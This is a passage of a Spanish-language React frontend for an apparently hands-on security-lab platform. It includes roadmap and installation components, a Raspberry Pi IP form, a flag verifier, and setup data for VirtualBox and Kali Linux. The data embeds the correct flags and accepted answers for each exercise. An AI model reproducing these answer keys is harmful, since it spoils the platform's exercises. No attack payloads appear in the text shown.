      togglePaso(moduloActivo.id, pasoActualIdx);
    }
    if (pasoActualIdx < totalPasos - 1) {
      setPasoActualIdx((i) => i + 1);
      setSubPasoIdx(0);
    }
  };

  if (!dataLab || modulos.length === 0) {
    return (
      <div className="roadmap-vacio">
        <p>No hay módulos definidos para este laboratorio.</p>
      </div>
    );
  }

  return (
    <div className="roadmap-lab-container">

      {/* Progreso global */}
      <div className="rl-progreso-global">
        <div className="rl-progreso-textos">
          <span className="rl-seccion-nombre">Progreso del Laboratorio</span>
          <span className="rl-progreso-stats">
            {stats.modulosCompletados}/{stats.totalModulos} módulos ({stats.porcentaje}%)
          </span>
        </div>
        <div className="rl-barra-global">
          <div className="rl-barra-fill" style={{ width: `${stats.porcentaje}%` }} />
        </div>
      </div>

      {/* Encabezado de la sección */}
      <div className="rl-itinerario-header">
        <h3 className="rl-itinerario-titulo">Módulos de Aprendizaje</h3>
      </div>

      {/* Grid de tarjetas de módulos */}
      <div className="rl-modulos-grid">
        {modulos.map((mod, idx) => {
          const resueltos = obtenerPasosCompletadosModulo(nombreLab, mod.id).length;
          const total = mod.pasos?.length || 0;
          const esActivo = moduloActivo?.id === mod.id;
          const estado = estadoMod(resueltos, total, esActivo);

          return (
            <div
              key={mod.id}
              className={`rl-mod-card rl-mod-card--${estado}`}
              onClick={() => setModuloActivoId(mod.id)}
              role="button"
              tabIndex={0}
            >
              <div className="rl-mod-card-top">
                <span className="rl-mod-numero-solo">{mod.numero}</span>
              </div>

              <div className="rl-mod-icono-wrap">
                {ICONOS[idx % ICONOS.length]}
              </div>

              <h3 className="rl-mod-titulo">{mod.titulo}</h3>
              <p className="rl-mod-nivel">{mod.nivel}</p>

              <div className="rl-mod-footer">
                <div className="rl-mod-mini-barra">
                  <div
                    className="rl-mod-mini-fill"
                    style={{ width: `${total > 0 ? (resueltos / total) * 100 : 0}%` }}
                  />
                </div>
                <span className="rl-mod-conteo">{resueltos}/{total} pasos</span>
              </div>
            </div>
          );
        })}
      </div>

      {/* Panel del módulo activo */}
      {moduloActivo && (
        <div className="rl-panel-activo">

          {/* Encabezado */}
          <div className="rl-panel-header">
            <div className="rl-panel-header-row">
              <div className="rl-panel-meta">
                <span className="rl-panel-numero-badge">{moduloActivo.numero}</span>
                <span className={`badge-nivel badge-nivel-${moduloActivo.nivel.toLowerCase().split(' ')[0]}`}>
                  {moduloActivo.nivel}
                </span>
              </div>
              <div className="rl-panel-progreso-fila">
                <span className="rl-prog-txt">{pasosCompletadosActivo.length}/{totalPasos} pasos</span>
                <div className="rl-barra-modulo">
                  <div className="rl-barra-modulo-fill" style={{ width: `${porcentaje}%` }} />
                </div>
                <span className="rl-prog-pct">{porcentaje}%</span>
              </div>
            </div>
            <h2 className="rl-panel-titulo">{moduloActivo.titulo}</h2>
          </div>

          {/* Stepper: un paso a la vez */}
          {pasoActual && (
            <div className="rl-stepper">

              {/* Selector de misiones del módulo (si hay más de 1) */}
              {totalPasos > 1 && (
                <div className="rl-misiones-selector">
                  <span className="rl-misiones-label">Misión {pasoActualIdx + 1} de {totalPasos}:</span>
                  <div className="rl-misiones-pills">
                    {moduloActivo.pasos.map((p, pIdx) => {
                      const estaHecho = pasosCompletadosActivo.includes(pIdx);
                      const esAct = pIdx === pasoActualIdx;
                      return (
                        <button
                          key={pIdx}
                          type="button"
                          className={`rl-mision-pill ${esAct ? 'rl-mision-pill--activo' : ''} ${estaHecho ? 'rl-mision-pill--hecho' : ''}`}
                          onClick={() => {
                            setPasoActualIdx(pIdx);
                            setSubPasoIdx(0);
                          }}
                          title={p.titulo}
                        >
                          {estaHecho && <span className="rl-mision-check">✓</span>}
                          Misión {pIdx + 1}
                        </button>
                      );
                    })}
                  </div>
                </div>
              )}

              {/* Indicadores de puntos por cada paso independiente de esta misión */}
              <div className="rl-stepper-dots">
                {datosPasoActual.instrucciones.map((_, i) => {
                  const esCurrent = i === subPasoIdx;
                  const hecho = i < subPasoIdx;
                  return (
                    <button
                      key={i}
                      type="button"
                      className={`rl-dot ${esCurrent ? 'rl-dot--current' : ''} ${hecho ? 'rl-dot--done' : ''}`}
                      onClick={() => setSubPasoIdx(i)}
                      title={`Paso ${i + 1}`}
                    />
                  );
                })}
              </div>

              {/* Tarjeta del paso actual */}
              <div className={`rl-paso rl-paso--single ${pasoCompletado ? 'rl-paso--completado' : ''}`}>

                <div className="rl-paso-header">
                  <div
                    className={`rl-paso-check ${pasoCompletado ? 'rl-paso-check--on' : ''}`}
                    onClick={() => togglePaso(moduloActivo.id, pasoActualIdx)}
                    role="checkbox"
                    tabIndex={0}
                    aria-checked={pasoCompletado}
                  >
                    {pasoCompletado ? '✓' : ''}
                  </div>
                  <span className="rl-paso-num">Paso {subPasoIdx + 1} de {totalSubPasos}</span>
                  <h4 className="rl-paso-titulo">{pasoActual.titulo}</h4>
                  {flagPasoOk && (
                    <span className="rl-paso-badge-flag-ok" title="Flag verificada para este paso">
                      ✓ Flag Verificada
                    </span>
                  )}
                </div>

                {/* Misión destacada con diseño táctico de alta visibilidad (sin emojis) */}
                {datosPasoActual.objetivo && (
                  <div className="rl-mision-caja">
                    <div className="rl-mision-tag">
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="rl-mision-icono">
                        <circle cx="12" cy="12" r="10" />
                        <line x1="22" y1="12" x2="18" y2="12" />
                        <line x1="6" y1="12" x2="2" y2="12" />
                        <line x1="12" y1="6" x2="12" y2="2" />
                        <line x1="12" y1="22" x2="12" y2="18" />
                      </svg>
                      <span>Misión</span>
                    </div>
                    <span className="rl-mision-texto">{formatearPayload(datosPasoActual.objetivo)}</span>
                  </div>
                )}

                {/* Contenido del paso actual independiente */}
                <div className="rl-paso-contenido-card">
                  <div className="rl-paso-num-circulo">{subPasoActual.num}</div>
                  <div className="rl-paso-texto-cuerpo">
                    {renderizarTextoPaso(subPasoActual.texto, formatearPayload)}
                  </div>
                </div>

                {/* Snippet / Payload (en el último paso de la misión, o si aplica) */}
                {pasoActual.payload && esUltimoSubPaso && (
                  <div className="rl-consola">
                    <div className="rl-consola-bar">
                      <span className="rl-consola-tag">Snippet / Payload</span>
                      <button
                        type="button"
                        className="rl-consola-btn-copiar"
                        onClick={(e) => copiarPayload(e, pasoActual.payload, pasoId)}
                      >
                        {copiado ? (
                          <>
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ marginRight: '4px' }}>
                              <polyline points="20 6 9 17 4 12" />
                            </svg>
                            Copiado
                          </>
                        ) : (
                          <>
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ marginRight: '4px' }}>
                              <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                            </svg>
                            Copiar
                          </>
                        )}
                      </button>
                    </div>
                    <pre className="rl-consola-codigo">
                      <code>{formatearPayload(pasoActual.payload)}</code>
                    </pre>
                  </div>
                )}

                {/* Verificador de flag — solo en el paso final de la misión */}
                {pasoActual.flag && esUltimoSubPaso && (
                  <VerificadorFlag
                    nombreLab={nombreLab}
                    moduloId={moduloActivo.id}
                    pasoIdx={pasoActualIdx}
                    flagCorrecta={pasoActual.flag}
                    flagsAceptadas={pasoActual.flagsAceptadas}
                    dondeEncontrarla={pasoActual.dondeEncontrarla}
                    quePoner={pasoActual.quePoner}
                    objetivoFlag={pasoActual.objetivoFlag}
                    onVerificado={() => setActualizador((p) => p + 1)}
                  />
                )}

                {/* Navegación entre pasos */}
                <div className="rl-stepper-nav">
                  <button
                    type="button"
                    className="btn btn-secundario rl-btn-paso"
                    disabled={subPasoIdx === 0 && pasoActualIdx === 0}
                    onClick={irSubPasoAnterior}
                  >
                    ← Anterior
                  </button>

                  <div className="rl-stepper-contador">
                    Paso {subPasoIdx + 1} de {totalSubPasos}
                  </div>

                  {!esUltimoSubPaso ? (
                    <button
                      type="button"
                      className="btn btn-primario rl-btn-paso"
                      onClick={irSubPasoSiguiente}
                    >
                      Siguiente paso →
                    </button>
                  ) : pasoActualIdx < totalPasos - 1 ? (
                    <button
                      type="button"
                      className="btn btn-primario rl-btn-paso"
                      onClick={marcarYAvanzarObjetivo}
                    >
                      {pasoCompletado ? 'Siguiente misión →' : 'Completar y continuar →'}
                    </button>
                  ) : (
                    <button
                      type="button"
                      className={`btn rl-btn-paso ${pasoCompletado ? 'btn-secundario' : 'btn-primario'}`}
                      onClick={() => togglePaso(moduloActivo.id, pasoActualIdx)}
                    >
                      {pasoCompletado ? 'Desmarcar paso' : 'Marcar como completado'}
                    </button>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Navegación */}
          <div className="rl-navegacion">
            {moduloAnterior ? (
              <button
                type="button"
                className="btn btn-secundario rl-btn-nav"
                onClick={() => {
                  setModuloActivoId(moduloAnterior.id);
                  window.scrollTo({ top: 150, behavior: 'smooth' });
                }}
              >
                ← {moduloAnterior.titulo}
              </button>
            ) : <div />}

            {moduloSiguiente ? (
              <button
                type="button"
                className="btn btn-primario rl-btn-nav"
                onClick={() => {
                  setModuloActivoId(moduloSiguiente.id);
                  window.scrollTo({ top: 150, behavior: 'smooth' });
                }}
              >
                {moduloSiguiente.titulo} →
              </button>
            ) : (
              <span className="mensaje-fin-roadmap">Último módulo del laboratorio</span>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default RoadmapLab;

``

### Archivo: `frontend/src/components/ModuloInstalacion.jsx`
``javascript
import { useState, useMemo } from "react";
import { MODULO_INSTALACION } from "../data/roadmapsData.js";
import { obtenerPasosCompletadosModulo, alternarPasoModulo } from "../data/progreso.js";

function ModuloInstalacion({ onVolver }) {
  const modulo = MODULO_INSTALACION;
  const [pasoActualIdx, setPasoActualIdx] = useState(0);
  const [actualizador, setActualizador] = useState(0);
  const [copiadoId, setCopiadoId] = useState(null);

  // eslint-disable-next-line react-hooks/exhaustive-deps
  const pasosCompletados = useMemo(() =>
    obtenerPasosCompletadosModulo("INSTALACION", modulo.id),
    [modulo.id, actualizador]
  );

  const togglePaso = (pasoIdx) => {
    alternarPasoModulo("INSTALACION", modulo.id, pasoIdx);
    setActualizador((prev) => prev + 1);
  };

  const copiarPayload = async (e, texto, id) => {
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(texto);
      setCopiadoId(id);
      setTimeout(() => setCopiadoId(null), 2000);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = texto;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
      setCopiadoId(id);
      setTimeout(() => setCopiadoId(null), 2000);
    }
  };

  const totalPasos = modulo.pasos?.length || 0;
  const pasoActual = modulo.pasos?.[pasoActualIdx] || null;
  const pasoId = pasoActual ? `instalacion-p-${pasoActualIdx}` : null;
  const pasoCompletado = pasosCompletados.includes(pasoActualIdx);
  const copiado = copiadoId === pasoId;
  const porcentaje = totalPasos > 0 ? Math.round((pasosCompletados.length / totalPasos) * 100) : 0;

  const irPasoAnterior = () => setPasoActualIdx((i) => Math.max(0, i - 1));
  const irPasoSiguiente = () => setPasoActualIdx((i) => Math.min(totalPasos - 1, i + 1));

  const marcarYAvanzar = () => {
    if (!pasoCompletado) togglePaso(pasoActualIdx);
    if (pasoActualIdx < totalPasos - 1) setPasoActualIdx((i) => i + 1);
  };

  return (
    <div className="instalacion-vista pagina-fluida">
      {/* Cabecera */}
      <div className="instalacion-top-bar">
        {onVolver && (
          <button className="btn btn-secundario btn-volver" onClick={onVolver}>
            ← Volver
          </button>
        )}
      </div>

      <div className="instalacion-hero">
        <div className="instalacion-hero-icono">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
            <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
          </svg>
        </div>
        <div className="instalacion-hero-texto">
          <h1 className="instalacion-hero-titulo">Instalación y Preparación de Herramientas</h1>
          <p className="instalacion-hero-desc">
            Guía detallada para configurar tu entorno completo antes de comenzar los laboratorios. Sigue cada paso en orden para garantizar un funcionamiento correcto.
          </p>
        </div>
      </div>

      {/* Barra de progreso global */}
      <div className="instalacion-progreso-bar-wrap">
        <div className="instalacion-progreso-info">
          <span>Progreso de instalacion</span>
          <span><strong>{pasosCompletados.length}</strong> / {totalPasos} pasos ({porcentaje}%)</span>
        </div>
        <div className="instalacion-progreso-track">
          <div className="instalacion-progreso-fill" style={{ width: `${porcentaje}%` }} />
        </div>
      </div>

      {/* Dots de pasos */}
      <div className="instalacion-steps-nav">
        {modulo.pasos.map((paso, i) => {
          const hecho = pasosCompletados.includes(i);
          const esCurrent = i === pasoActualIdx;
          return (
            <button
              key={i}
              type="button"
              className={`instalacion-step-dot ${esCurrent ? "dot-current" : ""} ${hecho ? "dot-done" : ""}`}
              onClick={() => setPasoActualIdx(i)}
              title={`Paso ${i + 1}: ${paso.titulo}`}
            >
              {hecho ? "✓" : i + 1}
            </button>
          );
        })}
      </div>

      {/* Panel del paso actual */}
      {pasoActual && (
        <div className={`instalacion-paso-panel ${pasoCompletado ? "paso-completado" : ""}`}>
          <div className="instalacion-paso-header">
            <div
              className={`instalacion-paso-check ${pasoCompletado ? "check-on" : ""}`}
              onClick={() => togglePaso(pasoActualIdx)}
              role="checkbox"
              tabIndex={0}
              aria-checked={pasoCompletado}
            >
              {pasoCompletado ? "✓" : ""}
            </div>
            <div className="instalacion-paso-meta">
              <span className="instalacion-paso-num">Paso {pasoActualIdx + 1} de {totalPasos}</span>
              <h2 className="instalacion-paso-titulo">{pasoActual.titulo}</h2>
            </div>
          </div>

          {pasoActual.como && (
            <div className="instalacion-paso-cuerpo">
              {pasoActual.como.split("\n\n").map((parrafo, pIdx) => (
                <p key={pIdx} className="instalacion-paso-parrafo">{parrafo}</p>
              ))}
            </div>
          )}

          {pasoActual.payload && (
            <div className="instalacion-consola">
              <div className="instalacion-consola-bar">
                <span className="instalacion-consola-tag">Comando / Referencia</span>
                <button
                  type="button"
                  className="instalacion-consola-copiar"
                  onClick={(e) => copiarPayload(e, pasoActual.payload, pasoId)}
                >
                  {copiado ? (
                    <>
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ marginRight: "4px" }}>
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                      Copiado
                    </>
                  ) : (
                    <>
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ marginRight: "4px" }}>
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                      </svg>
                      Copiar
                    </>
                  )}
                </button>
              </div>
              <pre className="instalacion-consola-codigo">
                <code>{pasoActual.payload}</code>
              </pre>
            </div>
          )}

          {/* Navegacion */}
          <div className="instalacion-paso-nav">
            <button
              type="button"
              className="btn btn-secundario rl-btn-paso"
              disabled={pasoActualIdx === 0}
              onClick={irPasoAnterior}
            >
              ← Anterior
            </button>

            <div className="instalacion-contador">
              {pasoActualIdx + 1} / {totalPasos}
            </div>

            {pasoActualIdx < totalPasos - 1 ? (
              <button
                type="button"
                className="btn btn-instalacion-next rl-btn-paso"
                onClick={marcarYAvanzar}
              >
                {pasoCompletado ? "Siguiente →" : "Completar y continuar →"}
              </button>
            ) : (
              <button
                type="button"
                className={`btn rl-btn-paso ${pasoCompletado ? "btn-secundario" : "btn-instalacion-next"}`}
                onClick={() => togglePaso(pasoActualIdx)}
              >
                {pasoCompletado ? "Desmarcar paso" : "Marcar como completado"}
              </button>
            )}
          </div>
        </div>
      )}

      {porcentaje === 100 && (
        <div className="instalacion-completado-msg">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <span>Entorno completamente configurado. Ya puedes comenzar los laboratorios.</span>
        </div>
      )}
    </div>
  );
}

export default ModuloInstalacion;

``

### Archivo: `frontend/src/components/FormularioIp.jsx`
``javascript
function FormularioIp({ inputIp, setInputIp, onGuardar, onVolver, esCambio }) {
  const manejarEnvio = (e) => {
    e.preventDefault();
    onGuardar();
  };

  return (
    <div className="pantalla-centrada">
      <div className="tarjeta-formulario-pro">
        {onVolver && (
          <button
            type="button"
            className="btn btn-secundario btn-volver-ip"
            onClick={onVolver}
          >
            ← Volver
          </button>
        )}

        <h1 className="formulario-titulo">
          {esCambio ? 'Cambiar IP de la Raspberry Pi' : 'Conectar con la Raspberry Pi'}
        </h1>
        <p className="formulario-subtitulo">
          Ingresa la dirección IP de tu Raspberry Pi para conectar la plataforma con tus laboratorios.
        </p>

        <form onSubmit={manejarEnvio} className="formulario-cuerpo">
          <input
            className="input-ip-simple"
            type="text"
            value={inputIp}
            onChange={(e) => setInputIp(e.target.value)}
            placeholder="Ejemplo: 192.168.1.100"
            autoFocus
            required
          />

          <button type="submit" className="btn btn-primario btn-conectar-pro">
            {esCambio ? 'Guardar y Continuar' : 'Conectar'}
          </button>
        </form>
      </div>
    </div>
  );
}

export default FormularioIp;
``

### Archivo: `frontend/src/components/VerificadorFlag.jsx`
``javascript
import { useState, useRef, useEffect } from 'react';
import { verificarFlagPaso, esFlagPasoVerificada, revocarFlagPaso } from '../data/progreso.js';
import './VerificadorFlag.css';

function VerificadorFlag({
  nombreLab,
  moduloId,
  pasoIdx,
  flagCorrecta,
  flagsAceptadas = [],
  dondeEncontrarla,
  quePoner,
  objetivoFlag,
  onVerificado,
}) {
  const [entrada, setEntrada] = useState('');
  const [errorMsg, setErrorMsg] = useState(null);
  const inputRef = useRef(null);

  const yaVerificada = esFlagPasoVerificada(nombreLab, moduloId, pasoIdx);
  const [estaVerificada, setEstaVerificada] = useState(yaVerificada);

  useEffect(() => {
    setEstaVerificada(esFlagPasoVerificada(nombreLab, moduloId, pasoIdx));
    setEntrada('');
    setErrorMsg(null);
  }, [nombreLab, moduloId, pasoIdx]);

  const intentarVerificar = () => {
    const textoAValidar = entrada.trim();
    if (!textoAValidar) return;

    const ok = verificarFlagPaso(nombreLab, moduloId, pasoIdx, textoAValidar, flagCorrecta, flagsAceptadas);
    if (ok) {
      setEstaVerificada(true);
      setErrorMsg(null);
      onVerificado?.();
    } else {
      setErrorMsg('Respuesta incorrecta. Revisa la pista e inténtalo de nuevo.');
    }
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      intentarVerificar();
    }
  };

  const reiniciarPaso = () => {
    revocarFlagPaso(nombreLab, moduloId, pasoIdx);
    setEstaVerificada(false);
    setEntrada('');
    setErrorMsg(null);
    onVerificado?.();
  };

  // Pista directa: solo indica dónde encontrarla, sin revelar la flag literal
  const textoPista = dondeEncontrarla || 'Localiza la evidencia en tu entorno e ingresa el resultado.';

  // ESTADO: VALIDADO (MINIMALISTA)
  if (estaVerificada) {
    return (
      <div className="vf-min-box vf-min-box--ok">
        <div className="vf-min-ok-info">
          <span className="vf-min-ok-check">✓</span>
          <span className="vf-min-ok-txt">Paso validado</span>
        </div>
        <button
          type="button"
          className="vf-min-btn-reiniciar"
          onClick={reiniciarPaso}
          title="Reiniciar validación"
        >
          Reiniciar
        </button>
      </div>
    );
  }

  // ESTADO: PENDIENTE DE VALIDACIÓN (MINIMALISTA)
  return (
    <div className="vf-min-box">
      {/* Pista limpia donde encontrar la flag */}
      <div className="vf-min-pista">
        <span className="vf-min-pista-label">Pista:</span>
        <span className="vf-min-pista-txt">{textoPista}</span>
      </div>

      {/* Input y botón directo */}
      <div className="vf-min-form">
        <input
          ref={inputRef}
          type="text"
          className={`vf-min-input ${errorMsg ? 'vf-min-input--error' : ''}`}
          placeholder="Ingresa la flag o evidencia..."
          value={entrada}
          onChange={(e) => {
            setEntrada(e.target.value);
            if (errorMsg) setErrorMsg(null);
          }}
          onKeyDown={handleKeyDown}
          autoComplete="off"
          spellCheck={false}
        />

        <button
          type="button"
          className="btn btn-primario vf-min-btn-validar"
          onClick={intentarVerificar}
          disabled={!entrada.trim()}
        >
          Validar
        </button>
      </div>

      {/* Mensaje de error discreto sin animaciones */}
      {errorMsg && (
        <span className="vf-min-error-txt">{errorMsg}</span>
      )}
    </div>
  );
}

export default VerificadorFlag;

``

### Archivo: `frontend/src/components/VerificadorFlag.css`
``css
/* =========================================================
   VERIFICADOR DE FLAG (MINIMALISTA Y ELEGANTE)
   ========================================================= */

.vf-min-box {
  margin: 16px 0 8px;
  padding: 14px 16px;
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 8px;
  box-sizing: border-box;
}

/* Pista elegante */
.vf-min-pista {
  font-size: 13px;
  line-height: 1.5;
  color: var(--texto-muted, #94a3b8);
  margin-bottom: 12px;
}

.vf-min-pista-label {
  font-family: var(--fuente-mono, monospace);
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.6px;
  color: #38bdf8;
  margin-right: 6px;
}

.vf-min-pista-txt {
  color: #e2e8f0;
}

/* Formulario minimalista en línea */
.vf-min-form {
  display: flex;
  align-items: center;
  gap: 8px;
}

.vf-min-input {
  flex: 1;
  background: rgba(0, 0, 0, 0.35);
  border: 1px solid rgba(255, 255, 255, 0.12);
  border-radius: 6px;
  padding: 9px 12px;
  font-family: var(--fuente-mono, monospace);
  font-size: 13px;
  color: #ffffff;
  outline: none;
  transition: border-color 0.15s ease;
}

.vf-min-input:focus {
  border-color: #38bdf8;
}

.vf-min-input--error {
  border-color: #f87171 !important;
}

.vf-min-input::placeholder {
  color: #64748b;
  font-size: 12px;
}

.vf-min-btn-validar {
  padding: 9px 16px;
  font-size: 12.5px;
  font-weight: 600;
  border-radius: 6px;
  white-space: nowrap;
}

/* Mensaje de error sobrio */
.vf-min-error-txt {
  display: block;
  font-size: 12px;
  color: #f87171;
  margin-top: 8px;
}

/* Estado validado: discreto y limpio */
.vf-min-box--ok {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(0, 224, 138, 0.05);
  border: 1px solid rgba(0, 224, 138, 0.3);
  padding: 10px 14px;
}

.vf-min-ok-info {
  display: flex;
  align-items: center;
  gap: 8px;
}

.vf-min-ok-check {
  font-weight: 700;
  color: var(--acento, #00e08a);
  font-size: 13px;
}

.vf-min-ok-txt {
  font-family: var(--fuente-mono, monospace);
  font-size: 12px;
  font-weight: 600;
  color: var(--acento, #00e08a);
  letter-spacing: 0.3px;
}

.vf-min-btn-reiniciar {
  background: transparent;
  border: none;
  color: var(--texto-muted, #94a3b8);
  font-family: var(--fuente-mono, monospace);
  font-size: 11px;
  cursor: pointer;
  padding: 4px 8px;
  border-radius: 4px;
  transition: color 0.15s ease;
}

.vf-min-btn-reiniciar:hover {
  color: #f87171;
}

``

### Archivo: `frontend/src/data/roadmapsData.js`
``javascript
// Datos curriculares estructurados para cada laboratorio
// Disenados con maxima claridad pedagogica, paso a paso guiado y explicaciones sencillas para usuarios principiantes.

// MODULO ESPECIAL: Instalacion y Preparacion de Herramientas
export const MODULO_INSTALACION = {
  id: 'instalacion-herramientas',
  esInstalacion: true,
  numero: 0,
  titulo: 'Instalacion y Preparacion de Herramientas',
  nivel: 'Basico',
  pasos: [
    {
      numero: 1,
      titulo: 'Requisitos previos del sistema',
      como: `Donde se hace: En tu computadora Windows (sin abrir aún ningún programa).

Objetivo: Comprobar que tu computadora tiene los recursos mínimos necesarios y la autorización del procesador para crear máquinas virtuales de práctica.

Paso a paso:
1. Presiona las teclas Ctrl + Shift + Esc al mismo tiempo para abrir el Administrador de Tareas.
2. Haz clic en la pestaña "Rendimiento" (arriba a la izquierda) y luego en "CPU".
3. En la parte inferior derecha, busca la palabra "Virtualización". Debe aparecer como "Habilitado" (o "Enabled").
4. Comprueba también que tu equipo tenga al menos 8 GB de memoria RAM y unos 40 GB de espacio libre en disco para alojar los entornos.

¿Por qué es necesario?: Para poder ejecutar Kali Linux dentro de tu computadora sin alterar tu Windows habitual, el procesador debe tener activada la tecnología de virtualización por hardware.

Como saber que funciono: Verás la palabra "Habilitado" en verde o texto claro junto a Virtualización en la sección de CPU.

En caso de problema: Si dice "Deshabilitado", reinicia tu PC y entra a la BIOS (presionando F2, F10, Supr o Del al encender). Busca "Intel Virtualization Technology" (VT-x) o "AMD SVM Mode" y cámbialo a "Enabled".`,
      payload: 'CPU: Virtualizacion habilitada | RAM: >= 8 GB | Disco: >= 40 GB libres',
      flag: 'FLAG{prep-hardware-virtualizacion-ok}',
      dondeEncontrarla: 'En el Administrador de Tareas de Windows (Rendimiento -> CPU).',
      quePoner: 'Escribe exactamente el estado que viste: Habilitado (o Enabled).',
      flagsAceptadas: ["Habilitado", "habilitado", "Habilitada", "Enabled", "enabled", "FLAG{prep-hardware-virtualizacion-ok}"],
      objetivoFlag: 'Verifica la virtualizacion por hardware habilitada y que cuentes con al menos 8 GB de RAM y 40 GB libres.'
    },
    {
      numero: 2,
      titulo: 'Descarga e instalacion de VirtualBox',
      como: `Donde se hace: En tu navegador web habitual en Windows.

Objetivo: Instalar Oracle VirtualBox, la aplicación gratuita que nos permitirá ejecutar computadoras virtuales completas dentro de tu sistema operativo.

Paso a paso:
1. Abre en tu navegador la página oficial: https://www.virtualbox.org/wiki/Downloads
2. En la sección "VirtualBox platform packages", haz clic en "Windows hosts" para descargar el instalador principal (.exe).
3. En la misma página, un poco más abajo, busca "Oracle VM VirtualBox Extension Pack" (en la sección "All supported platforms") y descárgalo también.
4. Ejecuta el instalador de VirtualBox que descargaste. Avanza haciendo clic en "Next" manteniendo todas las opciones recomendadas por defecto, acepta la advertencia temporal de red y pulsa "Install".
5. Al finalizar, abre VirtualBox. Ve al menú superior "Archivo" -> "Herramientas" (o "Preferencias") -> "Extensiones", haz clic en el botón "+" (Agregar), selecciona el archivo del Extension Pack descargado y acepta la licencia.

¿Por qué es necesario?: VirtualBox es el hipervisor donde vivirá Kali Linux. El Extension Pack añade soporte para pantallas de alta resolución, USB y mejor velocidad de trabajo.`,
      payload: 'https://www.virtualbox.org/wiki/Downloads',
      flag: 'FLAG{prep-virtualbox-extpack-instalado}',
      dondeEncontrarla: 'En la ventana de VirtualBox o en el menú de Extensiones instaladas.',
      quePoner: 'Escribe el nombre del programa instalado: VirtualBox',
      flagsAceptadas: ["VirtualBox", "virtualbox", "Oracle VM VirtualBox", "Extension Pack", "FLAG{prep-virtualbox-extpack-instalado}"],
      objetivoFlag: 'Descarga e instala Oracle VirtualBox junto al Extension Pack oficial.'
    },
    {
      numero: 3,
      titulo: 'Descarga de Kali Linux (imagen OVA preconfigurada)',
      como: `Donde se hace: En tu navegador web y en VirtualBox.

Objetivo: Descargar la máquina virtual oficial de Kali Linux ya armada y lista para usar, ahorrándote horas de instalación manual.

Paso a paso:
1. Ve al sitio oficial: https://www.kali.org/get-kali/#kali-virtual-machines
2. Busca la tarjeta que dice "VirtualBox" y haz clic en el botón de descarga directa (es un archivo .7z o .ova de aproximadamente 3 a 4 GB).
3. Si el archivo viene comprimido en formato .7z, haz clic derecho sobre él y extráelo con 7-Zip o WinRAR para obtener el archivo de la máquina virtual.
4. Abre VirtualBox, haz clic en el menú "Archivo" -> "Importar servicio virtualizado..." (o "Máquina" -> "Añadir...").
5. Selecciona el archivo extraído de Kali Linux, revisa que los valores vengan por defecto y presiona "Importar". Espera unos minutos mientras se importa la máquina.

¿Por qué es necesario?: Kali Linux es la distribución estándar de seguridad informática. Viene con cientos de herramientas de ciberseguridad listas para usar.`,
      payload: 'https://www.kali.org/get-kali/#kali-virtual-machines',
      flag: 'FLAG{prep-kali-ova-sha256-importada}',
      dondeEncontrarla: 'En la lista lateral de máquinas virtuales dentro de VirtualBox.',
      quePoner: 'Escribe el nombre del sistema que descargaste: kali linux (o simplemente kali).',
      flagsAceptadas: ["kali", "kali linux", "Kali", "Kali Linux", "FLAG{prep-kali-ova-sha256-importada}"],
      objetivoFlag: 'Descarga la maquina virtual Kali Linux OVA e importala en VirtualBox.'
    },
    {
      numero: 4,
      titulo: 'Configuracion de la maquina virtual Kali Linux',
      como: `Donde se hace: En la ventana principal de VirtualBox.

Objetivo: Asignar la cantidad correcta de memoria RAM, procesador y red para que Kali funcione con fluidez y pueda comunicarse con la Raspberry Pi.

Paso a paso:
1. En la columna izquierda de VirtualBox, haz clic sobre la máquina "Kali Linux" y luego en el botón con engranaje amarillo "Configuración".
2. Ve a la pestaña "Sistema" -> subpestaña "Placa base": asigna al menos 2048 MB (2 GB) de memoria RAM. Si tu equipo tiene 16 GB, puedes asignarle 4096 MB (4 GB).
3. En la subpestaña "Procesador": asigna al menos 2 CPUs (núcleos) para que el sistema responda rápido.
4. Ve a "Pantalla": sube la memoria de video a 128 MB.
